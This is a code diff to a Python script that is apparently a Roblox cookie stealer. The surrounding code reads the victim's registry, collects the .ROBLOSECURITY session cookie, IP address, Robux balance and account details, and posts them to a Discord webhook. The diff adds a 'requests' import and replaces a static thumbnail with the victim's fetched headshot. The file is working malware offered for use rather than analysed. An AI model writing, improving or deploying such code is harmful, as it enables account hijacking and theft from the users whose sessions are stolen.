@@ -18,6 +18,7 @@ try:
     from winreg import OpenKey, HKEY_CURRENT_USER, EnumValue
     import robloxpy
     import json
+    import requests
     import os
     from discordwebhook import *
 except:
@@ -62,6 +63,7 @@ rid = info["UserID"]
 rap = robloxpy.User.External.GetRAP(rid)
 friends = robloxpy.User.Friends.External.GetCount(rid)
 age = robloxpy.User.External.GetAge(rid)
+headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
@@ -95,9 +97,10 @@ discord.post(
                 {"name" : "Friends", "value": friends, "inline": True},
                 {"name" : "Account Age", "value": age, "inline": True},
                 {"name" : "IP Address", "value" : ip_address, "inline:": True},
+
                 {"name" : ".ROBLOSECURITY", "value": f"```{roblox_cookie}```", "inline": False},
             ],
-            "thumbnail": {"url": "https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png"},
+            "thumbnail": {"url": headshot},
 
 
         }
